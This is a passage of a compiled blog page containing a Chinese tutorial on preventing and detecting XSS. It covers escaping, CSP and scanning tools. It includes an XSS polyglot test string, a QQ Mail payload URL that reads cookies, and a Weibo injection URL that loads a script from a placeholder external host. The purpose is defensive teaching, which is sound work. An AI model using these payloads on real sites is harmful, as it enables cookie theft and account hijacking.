class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。</p><h3 id="预防-dom-型-xss-攻击" tabindex="-1"><a class="header-anchor" href="#预防-dom-型-xss-攻击"><span>预防 DOM 型 XSS 攻击</span></a></h3><p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p><p>如果用 Vue/React 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p><p>DOM 中的内联事件监听器，如 <code>location</code>、<code>onclick</code>、<code>onerror</code>、<code>onload</code>、<code>onmouseover</code> 等，<code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;!-- 内联事件监听器中包含恶意代码 --&gt;</span></span>
<span class="line"><span>&lt;img onclick=&quot;UNTRUSTED&quot; onerror=&quot;UNTRUSTED&quot; src=&quot;data:image/png,&quot;&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;!-- 链接内包含恶意代码 --&gt;</span></span>
<span class="line"><span>&lt;a href=&quot;UNTRUSTED&quot;&gt;1&lt;/a&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;script&gt;</span></span>
<span class="line"><span>// setTimeout()/setInterval() 中调用恶意代码</span></span>
<span class="line"><span>setTimeout(&quot;UNTRUSTED&quot;)</span></span>
<span class="line"><span>setInterval(&quot;UNTRUSTED&quot;)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>// location 调用恶意代码</span></span>
<span class="line"><span>location.href = &#39;UNTRUSTED&#39;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>// eval() 中调用恶意代码</span></span>
<span class="line"><span>eval(&quot;UNTRUSTED&quot;)</span></span>
<span class="line"><span>&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p><h2 id="其他-xss-防范措施" tabindex="-1"><a class="header-anchor" href="#其他-xss-防范措施"><span>其他 XSS 防范措施</span></a></h2><p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p><h3 id="content-security-policy" tabindex="-1"><a class="header-anchor" href="#content-security-policy"><span>Content Security Policy</span></a></h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p><ul><li>禁止加载外域代码，防止复杂的攻击逻辑。</li><li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li><li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li><li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li><li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li></ul><h3 id="输入内容长度控制" tabindex="-1"><a class="header-anchor" href="#输入内容长度控制"><span>输入内容长度控制</span></a></h3><p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p><h3 id="其他安全措施" tabindex="-1"><a class="header-anchor" href="#其他安全措施"><span>其他安全措施</span></a></h3><ul><li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</li><li>验证码：防止脚本冒充用户提交危险操作。</li></ul><h2 id="xss-的检测" tabindex="-1"><a class="header-anchor" href="#xss-的检测"><span>XSS 的检测</span></a></h2><p>两个方法：</p><ol><li>使用通用 XSS 攻击字符串手动检测 XSS 漏洞。</li><li>使用扫描工具自动检测 XSS 漏洞。</li></ol><p>在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F0xsobky%2FHackVault%2Fwiki%2FUnleashing-an-Ultimate-XSS-Polyglot" target="_blank" rel="noopener noreferrer">Unleashing an Ultimate XSS Polyglot</a>一文中，小明发现了这么一个字符串：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码jaVasCript:/*-/*\`/*\\\`/*&#39;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3e</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 <code>eval()</code>、<code>setTimeout()</code>、<code>setInterval()</code>、<code>Function()</code>、<code>innerHTML</code>、<code>document.write()</code> 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。</p><p>小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码http://xxx/search?keyword=jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FArachni%2Farachni" target="_blank" rel="noopener noreferrer">Arachni</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmozilla%2Fhttp-observatory%2F" target="_blank" rel="noopener noreferrer">Mozilla HTTP Observatory</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fandresriancho%2Fw3af" target="_blank" rel="noopener noreferrer">w3af</a> 等。</p><h2 id="xss-攻击的总结" tabindex="-1"><a class="header-anchor" href="#xss-攻击的总结"><span>XSS 攻击的总结</span></a></h2><p>我们回到最开始提出的问题，相信同学们已经有了答案：</p><ol><li>XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</li></ol><blockquote><p>不正确。因为：</p><ul><li>防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。</li><li>转义应该在输出 HTML 时进行，而不是在提交用户输入时。</li></ul></blockquote><ol><li>所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</li></ol><blockquote><p>不正确。 不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。</p></blockquote><p>整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。</p><p>虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生：</p><ul><li><strong>利用模板引擎</strong> 开启模板引擎自带的 HTML 转义功能。例如： 在 ejs 中，尽量使用 <code>&lt;%= data %&gt;</code> 而不是 <code>&lt;%- data %&gt;</code>； 在 doT.js 中，尽量使用 <code>{{! data }</code> 而不是 <code>{{= data }</code>； 在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 <code>freemarker.core.OutputFormat</code>。</li><li><strong>避免内联事件</strong> 尽量不要使用 <code>onLoad=&quot;onload(&#39;{{data}}&#39;)&quot;</code>、<code>onClick=&quot;go(&#39;{{action}}&#39;)&quot;</code> 这种拼接内联事件的写法。在 JavaScript 中通过 <code>.addEventlistener()</code> 事件绑定会更安全。</li><li><strong>避免拼接 HTML</strong> 前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 <code>createElement</code>、<code>setAttribute</code> 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。</li><li><strong>时刻保持警惕</strong> 在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。</li><li><strong>增加攻击难度，降低攻击后果</strong> 通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。</li><li><strong>主动检测和发现</strong> 可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。</li></ul><h2 id="xss-攻击案例" tabindex="-1"><a class="header-anchor" href="#xss-攻击案例"><span>XSS 攻击案例</span></a></h2><h4 id="qq-邮箱-m-exmail-qq-com-域名反射型-xss-漏洞" tabindex="-1"><a class="header-anchor" href="#qq-邮箱-m-exmail-qq-com-域名反射型-xss-漏洞"><span>QQ 邮箱 <a href="https://link.juejin.cn?target=http%3A%2F%2Fm.exmail.qq.com" target="_blank" rel="noopener noreferrer">m.exmail.qq.com</a> 域名反射型 XSS 漏洞</span></a></h4><p>攻击者发现 <code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb</code> 这个 URL 的参数 <code>uin</code>、<code>domain</code> 未经转义直接输出到 HTML 中。</p><p>于是攻击者构建出一个 URL，并引导用户去点击： <code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B</code></p><p>用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;script&gt;</span></span>
<span class="line"><span>getTop().location.href=&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa&quot;+&quot;&amp;t=&quot;+&quot;&amp;d=bbbb&quot;;return false;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;+&quot;...</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>浏览器接收到响应后就会执行 <code>alert(document.cookie)</code>，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。</p><h4 id="新浪微博名人堂反射型-xss-漏洞" tabindex="-1"><a class="header-anchor" href="#新浪微博名人堂反射型-xss-漏洞"><span>新浪微博名人堂反射型 XSS 漏洞</span></a></h4><p>攻击者发现 <code>http://weibo.com/pub/star/g/xyyyd</code> 这个 URL 的内容未经过滤直接输出到 HTML 中。</p><p>于是攻击者构建出一个 URL，然后诱导用户去点击：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：</p><div class="language- line-numbers-mode" data-ext="" data-title=""><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>复制代码&lt;li&gt;&lt;a href=&quot;http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;&quot;&gt;按分类检索&lt;/a&gt;&lt;/li&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>浏览器接收到响应后就会加载执行恶意脚本 <code>//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。</p>`,178)]))}const c=s(i,[["render",l],["__file","index.html.vue"]]),o=JSON.parse('{"path":"/article/1xo28ziw/","title":"XSS攻击","lang":"zh-CN","frontmatter":{"title":"XSS攻击","tags":["笔记","学习","面试"],"createTime":"2023/11/26","permalink":"/article/1xo28ziw/","description":"XSS攻击的介绍 XSS 漏洞的发生和修复 XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。 一个案例 某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下： 然而，在上线后不久，小明就接到了安全组发来的一个神秘链接： 小明带着一种不祥的预感点开了这个链接...","head":[["meta",{"property":"og:url","content":"https://jyqwq.github.io/rainbow/article/1xo28ziw/"}],["meta",{"property":"og:site_name","content":"纸上的彩虹"}],["meta",{"property":"og:title","content":"XSS攻击"}],["meta",{"property":"og:description","content":"XSS攻击的介绍 XSS 漏洞的发生和修复 XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。 一个案例 某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下： 然而，在上线后不久，小明就接到了安全组发来的一个神秘链接： 小明带着一种不祥的预感点开了这个链接..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:tag","content":"笔记"}],["meta",{"property":"article:tag","content":"学习"}],["meta",{"property":"article:tag","content":"面试"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"XSS攻击\\",\\"image\\":[\\"\\"],\\"dateModified\\":null,\\"author\\":[]}"]]},"headers":[],"readingTime":{"minutes":21.83,"words":6550},"git":{},"autoDesc":true,"filePathRelative":"日常学习/XSS攻击.md","categoryList":[{"id":"9a91b4","sort":10001,"name":"日常学习"}],"bulletin":false}');export{c as comp,o as data};
